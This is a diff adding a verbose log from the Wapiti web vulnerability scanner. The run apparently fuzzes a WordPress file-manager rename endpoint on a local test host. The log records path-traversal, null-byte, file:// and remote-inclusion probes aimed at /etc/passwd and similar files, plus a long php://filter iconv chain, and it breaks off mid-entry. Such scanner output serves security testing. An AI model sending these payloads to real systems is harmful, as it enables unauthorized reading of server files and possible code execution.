@@ -1,0 +1,700 @@
+2024-03-21 15:26:12.509 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:13.430 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-21 15:26:13.430 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_44fea945.db
+2024-03-21 15:26:13.435 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-21 15:26:13.475 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-21 15:26:13.475 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-21 15:26:13.570 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-21 15:26:13.587 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-21 15:26:13.587 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-21 15:26:13.600 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:16.007 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-21 15:26:16.023 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:16.026 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:16.792 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:17.541 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:18.290 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fetc%2Fpasswd%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:19.048 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:19.804 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:20.549 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:21.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:22.045 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:22.800 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:23.554 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:24.306 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:25.061 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:25.809 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:26.561 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:27.310 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:28.052 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:28.797 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:29.548 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:30.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:31.045 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:31.796 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:32.546 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:33.304 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:34.051 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:34.808 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:35.552 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:36.305 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:37.043 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:37.786 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:38.533 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:39.285 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:40.039 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:40.808 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:41.575 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:42.328 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:43.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:43.848 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:44.594 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:45.346 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:46.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:46.843 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:47.594 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:48.350 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:49.091 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:49.837 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:50.630 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:51.407 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:52.183 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:52.935 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:53.692 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:54.457 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=file%3A%2F%2F%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:55.224 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:55.970 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:56.719 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:57.472 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:58.226 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:58.984 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:26:59.738 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:27:00.489 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=index.php (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:27:01.247 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=index.php%00 (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:27:01.988 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=index.php%3A%3A%24DATA (0)
+	data: filename=fuzz&fileid=45
+2024-03-21 15:27:02.755 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&fileid=45
+2024-03-21 15:27:03.605 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&fileid=45
+2024-03-21 15:27:04.420 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%2Fetc%2Fpasswd&fileid=45
+2024-03-21 15:27:05.221 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%2Fetc%2Fpasswd%00&fileid=45
+2024-03-21 15:27:06.039 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
+	data: filename=%2Fetc%2Fservices&fileid=45
+2024-03-21 15:27:06.850 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/index.php?rest_route=%2Fwpfm%2Fv1%2Ffile-rename (0)
